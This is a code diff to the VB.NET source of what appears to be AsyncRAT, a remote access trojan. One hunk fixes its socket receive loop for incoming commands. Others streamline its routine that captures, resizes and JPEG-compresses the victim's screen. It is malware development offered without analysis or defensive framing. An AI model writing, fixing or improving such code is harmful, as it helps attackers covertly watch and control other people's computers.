@@ -204,12 +204,12 @@ Namespace AsyncRAT
                             Debug.WriteLine("BeginReceive : Received Full Packet : NotEqual")
                         End If
                     End If
+                    S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
                 Else
                     Debug.WriteLine("BeginReceive : Disconnected")
                     isConnected = False
                     Exit Sub
                 End If
-                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
             Catch ex As Exception
                 Debug.WriteLine("BeginReceive : Failed")
                 isConnected = False
@@ -429,13 +429,7 @@ Namespace AsyncRAT
                         End Using
 
                         'Resize
-                        Using Resize As New Bitmap(W, H)
-                            Using ImageResize As Graphics = Graphics.FromImage(Resize)
-                                ImageResize.CompositingQuality = CompositingQuality.HighSpeed
-                                ImageResize.DrawImage(ScreenSize, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
-                            End Using
-
-
+                        Using Resize = New Bitmap(ScreenSize, W, H)
 
                             'compress
                             Using encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50)
@@ -450,7 +444,6 @@ Namespace AsyncRAT
                             End Using
                         End Using
                     End Using
-
                 Catch ex As Exception
                     Debug.WriteLine("Capture" + ex.Message)
                 End Try
